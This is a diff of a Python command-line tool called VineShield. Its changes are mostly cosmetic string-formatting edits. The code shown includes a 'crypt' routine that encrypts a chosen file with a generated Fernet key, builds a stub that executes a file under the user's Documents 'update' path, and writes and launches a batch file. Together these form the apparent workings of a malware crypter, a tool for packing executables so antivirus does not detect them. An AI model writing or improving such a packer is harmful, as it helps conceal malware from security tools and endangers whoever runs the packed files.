@@ -48,24 +48,24 @@ $dependencies\n\tinstall all dependencies
         os.system('''start /wait cmd /c pip install pyinstaller pip install cryptography''')
     
     def Crypt():
-        print(style.BLUE+"[?]path to file for crypt",end="")
-        print(style.VIOLET+">>> ",end="")
+        print(f"{style.BLUE}[?]path to file for crypt", end="")
+        print(f"{style.VIOLET}>>> ", end="")
         file_crypt = str(input(style.CYAN))
         file_crypt_name = file_crypt[file_crypt.rfind("\\")+1:]
-        print(style.BLUE+"[?]name of build",end="")
-        print(style.VIOLET+">>> ",end="")
+        print(f"{style.BLUE}[?]name of build", end="")
+        print(f"{style.VIOLET}>>> ", end="")
         name = str(input(style.CYAN))
-        print(style.BLUE+"[?]path to icon/none",end="")
-        print(style.VIOLET+">>> ",end="")
+        print(f"{style.BLUE}[?]path to icon/none", end="")
+        print(f"{style.VIOLET}>>> ", end="")
         icon = str(input(style.CYAN))
-        input(style.YELLOW+"[i]press enter to start")
+        input(f"{style.YELLOW}[i]press enter to start")
         print(style.GREY)
         try:
             key = Fernet.generate_key()
             f = Fernet(key)
             with open(file_crypt, 'rb') as file:
                 file_data = file.read()
-            encrypted_data = f.encrypt(file_data) 
+            encrypted_data = f.encrypt(file_data)
             new_name = f.encrypt(file_crypt_name.encode())
             with open(f"enc_{file_crypt_name}", 'wb') as file:
                 file.write(encrypted_data)
@@ -98,7 +98,7 @@ subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\Documents\update
 
 os._exit(0)
 '''
-        
+
             batCode = fr'''
 @echo off  
 chcp 65001  
@@ -136,11 +136,11 @@ pause'''
             with open(f"{name}.bat", 'w', encoding='utf-8') as f:
                 f.write(batCode)
             os.startfile(f"{name}.bat")
-            input(style.GREEN+"[i]if crypting end...press enter")
+            input(f"{style.GREEN}[i]if crypting end...press enter")
             os.system("cls")
         except Exception as error:
             print(error)
-            input(style.GREEN+"[i]Fatal_Error...press enter")
+            input(f"{style.GREEN}[i]Fatal_Error...press enter")
         os.system("cls")
         VineShield()
 
@@ -160,19 +160,19 @@ class VineShield:
      \/    |_||_| |_| \___||_____/ |_| |_||_| \___||_| \__,_|'''
         print(style.BLUE+logo)
         self.user = getuser()
-        print(style.BLUE+"Welcome to VineShield,",self.user+"!")
+        print(f"{style.BLUE}Welcome to VineShield,", f"{self.user}!")
         print(style.YELLOW+"[i]type \"$help\" to get commands list\n")
         self.GetInput()
 
     def GetInput(self) -> None:
         while True:
             print(style.GREEN+self.user,end="~")
-            print(style.VIOLET+">>> ",end="")
+            print(f"{style.VIOLET}>>> ", end="")
             command = str(input(style.CYAN))
             self.CommandProc(command)
 
     def CommandProc(self, command) -> None:
-        if(command[0] == "$"):
+        if (command[0] == "$"):
             command = command[1:]
             match command:
                 case "help":
@@ -183,13 +183,15 @@ class VineShield:
                     Funcs.Author()
                 case "crypt":
                     Funcs.Crypt()
-                case  "dependencies":
+                case "dependencies":
                     Funcs.Dependencies()
                 case _:
-                    print(style.RED+"[!]Error unknown service command")
-                    print(style.YELLOW+"[i]type \"$help\" to get commands list\n")
+                    print(f"{style.RED}[!]Error unknown service command")
+                    print(
+                        style.YELLOW + "[i]type \"$help\" to get commands list\n"
+                    )
         else:
-            print(style.RED+"[!]Error not service command")
+            print(f"{style.RED}[!]Error not service command")
 
 
 
